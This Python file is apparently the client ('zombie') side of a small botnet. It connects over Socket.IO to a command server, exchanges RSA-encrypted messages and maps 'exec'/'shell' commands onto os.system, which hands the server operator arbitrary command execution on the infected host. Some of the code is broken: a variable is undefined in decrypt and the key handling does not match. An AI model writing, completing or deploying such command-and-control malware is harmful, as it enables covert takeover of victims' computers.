import socketio
import os
import hashlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import json
import time
import base64

sio = socketio.Client()
public_key, private_key = None, None

@sio.event
def public_key_received(data):
    
    print(data)
    global public_key
    public_key = RSA.import_key(data)
    print("Public key received.")
    send_encrypted_message('message Hello from zombie!')

def send_encrypted_message(message):
    time.sleep(3)
    global public_key
    while public_key is None:  
        print("Waiting for public key...")
        time.sleep(1)  
    
    a_hash = hashlib.sha256()
    a_hash.update(message.encode())
    
    cipher = PKCS1_OAEP.new(public_key)
    
    encrypted_data = cipher.encrypt(message.encode())

    encoded_data = base64.b64encode(encrypted_data).decode('utf-8')

    data = {
        'encrypted_message': encoded_data,
        'message_hash': a_hash.hexdigest()
    }
    
    sio.emit('message', json.dumps(data))
    
def get_private_key():
    global private_key
    private_key = RSA.generate(2048)
    return private_key
    
def decrypt(encrypted_data, message_hash):
    global private_key
    if private_key is None:
        get_private_key()
        
        
    cipher = PKCS1_OAEP.new(private_key)

    encrypted_bytes = base64.b64decode(encrypted_data)

    decrypted_data = cipher.decrypt(encrypted_bytes)
    calculated_hash = hashlib.sha256(decrypted_message).hexdigest()

    
    if calculated_hash == message_hash:
        return decrypted_data.decode()
    else:
        raise ValueError("Hash non valido")

@sio.event
def connect():
    print('Connection established')

def ping(args):
    send_encrypted_message('message Pinged zombie!')

def shell(args):
    return os.system(' '.join(args[1:]))

@sio.event
def message(data):
    encrypted_data = data['encrypted_message']
    received_hash = data['message_hash']
    
    try:
        decrypted_message = decrypt(encrypted_data, received_hash)
        print(f"Messaggio decifrato: {decrypted_message}")
        
        
        command = decrypted_message.split(' ')
        commands = [
            {
                'name': ['ping', 'check', 'hello'],
                'callback': ping,
            },
            {
                'name': ['exec', 'shell'],
                'callback': shell,
            }
        ]
        
        for cmd in commands:
            if command[0].replace('-all', '') in cmd['name']:
                cmd['callback'](command)
                
    except ValueError as e:
        print(f"Errore durante la decifrazione: {e}")


    
            

@sio.event
def disconnect():
    print('Disconnected from server')

def main():
    sio.connect('http://localhost:3000')
    sio.wait()

if __name__ == '__main__':
    main()
